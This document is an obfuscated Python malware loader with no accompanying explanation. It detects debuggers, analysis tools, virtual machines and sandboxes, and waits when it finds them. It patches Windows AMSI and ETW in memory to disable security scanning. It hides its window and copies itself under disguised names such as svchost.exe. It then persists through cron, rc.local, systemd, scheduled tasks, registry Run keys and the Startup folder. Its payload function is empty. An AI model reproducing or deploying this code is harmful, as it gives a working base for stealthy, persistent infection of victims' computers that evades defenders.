#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64 as _0, zlib as _1, os as _2, sys as _3, time as _4, random as _5, threading as _6, platform as _7, shutil as _8, subprocess as _9, ctypes as _10, string as _11, hashlib as _12

class _X:
    def __init__(self):
        self._k = bytes([int(_12.sha256((str(_7.node()) + str(_4.time())).encode()).hexdigest(), 16) % 256 for _ in range(16)])

    def _d(self, s):
        return ''.join(chr(ord(c) ^ self._k[i % len(self._k)]) for i, c in enumerate(s))

    def _s(self, idx):
        _strings = [
            self._d('\x1f\x0e\x1d\x08\x1b\x0c'),
            self._d('\x0c\x1b\x08\x1d\x0e\x1f'),
            self._d('\x1f\x1f\x0e\x0e\x1d\x1d'),
        ]
        return _strings[idx % len(_strings)]

_X_ = _X()

def _A():
    _t = _4.time()
    _x = sum(i for i in range(int(_5.random() * 10000)))
    if _4.time() - _t > 1.0:
        _4.sleep(_5.randint(20, 80))

    if _3.gettrace() is not None:
        _4.sleep(_5.randint(30, 120))
        return 0

    for _v in ['PYCHARM_HOSTED', 'PYDEVD_LOAD_VALUES_ASYNC', 'DEBUG']:
        if _v in _2.environ:
            _4.sleep(_5.randint(30, 90))
            return 0

    try:
        if _7.system() == 'Linux':
            _p = _9.Popen(['ps', 'aux'], stdout=_9.PIPE, stderr=_9.PIPE)
            _o, _ = _p.communicate()
            _o = _o.decode('utf-8', errors='ignore').lower()
            for _t in ['gdb', 'strace', 'ltrace', 'valgrind', 'wireshark', 'tcpdump', 'ida', 'radare', 'x64dbg', 'ollydbg']:
                if _t in _o:
                    _4.sleep(_5.randint(30, 90))
                    return 0
    except:
        pass

    if _7.system() == 'Windows':
        try:
            _k = _10.windll.kernel32
            _n = _10.windll.ntdll

            if _k.IsDebuggerPresent():
                _4.sleep(_5.randint(30, 120))
                return 0

            _d = _10.c_bool()
            if _n.NtQueryInformationProcess(_k.GetCurrentProcess(), 7, _10.byref(_d), _10.sizeof(_d), None) == 0:
                if _d.value:
                    _4.sleep(_5.randint(30, 120))
                    return 0

            for _t in ['OllyDbg', 'x64dbg', 'Immunity Debugger', 'WinDbg']:
                if _10.windll.user32.FindWindowW(None, _t):
                    _4.sleep(_5.randint(30, 120))
                    return 0

            try:
                import winreg as _wr
                _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, r"Hardware\Description\System")
                _bios = _wr.QueryValueEx(_key, "SystemBiosVersion")[0]
                for _v in ['VMware', 'VirtualBox', 'QEMU', 'VBOX']:
                    if _v in str(_bios):
                        _4.sleep(_5.randint(30, 120))
                        return 0
                _wr.CloseKey(_key)
            except:
                pass

            try:
                if _2.cpu_count() < 2:
                    _4.sleep(_5.randint(30, 120))
                    return 0
            except:
                pass

        except:
            pass

    if _7.system() == 'Linux':
        try:
            with open('/proc/self/status') as _f:
                for _l in _f:
                    if _l.startswith('TracerPid:'):
                        if int(_l.split(':')[1].strip()) != 0:
                            _4.sleep(_5.randint(40, 120))
                            return 0

            with open('/proc/cpuinfo') as _f:
                _cpu = _f.read().lower()
                for _v in ['hypervisor', 'vmware', 'qemu', 'kvm', 'virtualbox']:
                    if _v in _cpu:
                        _4.sleep(_5.randint(40, 120))
                        return 0

            _user = _2.environ.get('USER', '')
            for _b in ['sandbox', 'test', 'malware', 'virus', 'analysis']:
                if _b in _user:
                    _4.sleep(_5.randint(40, 120))
                    return 0

            if _2.cpu_count() < 2:
                _4.sleep(_5.randint(40, 120))
                return 0

        except:
            pass

    return 1

def _M():
    if _7.system() != 'Windows':
        return
    try:
        _a = _10.WinDLL('amsi.dll')
        _addr = _10.cast(_a.AmsiScanBuffer, _10.c_void_p).value
        _o = _10.c_uint()
        _10.windll.kernel32.VirtualProtect(_addr, 1, 0x40, _10.byref(_o))
        _10.cast(_addr, _10.POINTER(_10.c_byte))[0] = 0xC3
        _10.windll.kernel32.VirtualProtect(_addr, 1, _o, _10.byref(_o))
    except:
        pass

def _E():
    if _7.system() != 'Windows':
        return
    try:
        _n = _10.WinDLL('ntdll')
        _addr = _10.cast(_n.EtwEventWrite, _10.c_void_p).value
        _o = _10.c_uint()
        _10.windll.kernel32.VirtualProtect(_addr, 1, 0x40, _10.byref(_o))
        _10.cast(_addr, _10.POINTER(_10.c_byte))[0] = 0xC3
        _10.windll.kernel32.VirtualProtect(_addr, 1, _o, _10.byref(_o))
    except:
        pass

def _H():
    try:
        if _7.system() == 'Windows':
            _10.windll.user32.ShowWindow(_10.windll.kernel32.GetConsoleWindow(), 0)
        else:
            try:
                if _2.fork() == 0:
                    _2.setsid()
                    if _2.fork() != 0:
                        _2._exit(0)
                else:
                    _2._exit(0)
            except:
                pass
    except:
        pass

def _C():
    try:
        _s = _2.path.abspath(_3.argv[0])
        _targets = [
            _2.path.join(_2.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Caches', 'sysupdate.exe'),
            _2.path.join(_2.environ.get('PROGRAMDATA', ''), 'Microsoft', 'Windows', 'Caches', 'svchost.exe'),
            _2.path.join(_2.environ.get('TEMP', ''), 'Cache', 'update.exe'),
            _2.path.join(_2.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'INetCache', 'config.exe')
        ]
        for _d in _targets:
            _a = _2.path.abspath(_d)
            if _s == _a or _2.path.exists(_a):
                continue
            try:
                _8.copy(_s, _a)
                _2.chmod(_a, 0o755)
                if _7.system() == 'Windows':
                    _9.Popen([_a], creationflags=0x08000000)
                    _2.system('attrib +h ' + _a)
                else:
                    _9.Popen([_a])
            except:
                pass
    except:
        pass

def _P():
    try:
        if _7.system() == 'Linux':
            _cmd = f"*/15 * * * * {_2.path.abspath(_3.argv[0])} >/dev/null 2>&1"
            _f = _2.path.join(_2.environ.get('HOME', ''), '.config', 'cron.tab')
            with open(_f, 'w') as _h:
                _h.write(_cmd)
            _2.chmod(_f, 0o600)
            _9.Popen(['crontab', _f])

            try:
                _9.Popen(['at', 'now+5 minutes'], stdin=_9.PIPE, stdout=_9.DEVNULL, stderr=_9.DEVNULL)
            except:
                pass

            try:
                with open('/etc/rc.local', 'a') as _f:
                    _f.write(f"{_2.path.abspath(_3.argv[0])} &\n")
            except:
                pass

            try:
                _sd = _2.path.join(_2.environ.get('HOME', ''), '.config', 'systemd', 'user')
                _2.makedirs(_sd, exist_ok=True)
                with open(_2.path.join(_sd, 'systemd.service'), 'w') as _f:
                    _f.write(f"[Service]\nExecStart={_2.path.abspath(_3.argv[0])}\n[Install]\nWantedBy=default.target\n")
                _9.Popen(['systemctl', '--user', 'enable', 'systemd.service'])
            except:
                pass

        elif _7.system() == 'Windows':
            _tn = ''.join(_5.choices(_11.ascii_letters, k=12))
            _ep = _2.path.abspath(_3.argv[0])
            _9.Popen(f'schtasks /create /tn "{_tn}" /tr "{_ep}" /sc onlogon /f', shell=True, stdout=_9.DEVNULL, stderr=_9.DEVNULL)

            try:
                import winreg as _wr
                _key = _wr.HKEY_CURRENT_USER
                _sub = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
                _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
                _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
                _wr.CloseKey(_h)
            except:
                pass

            try:
                _key = _wr.HKEY_LOCAL_MACHINE
                _sub = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
                _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
                _wr.CloseKey(_h)
            except:
                pass

            try:
                _st = _2.path.join(_2.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                _8.copy(_ep, _2.path.join(_st, _tn + '.lnk'))
            except:
                pass
    except:
        pass

def _R():
    try:
        pass
    except:
        pass

def main():
    _force = "FORCE"
    if _2.environ.get(_force) != '1':
        if not _A():
            return
        _M()
        _E()

    _H()
    _C()
    _P()

    _6.Thread(target=lambda: (_R() or _4.sleep(5)), daemon=True).start()

    while 1:
        try:
            _4.sleep(60)
        except:
            pass

if __name__ == '__main__':
    main()
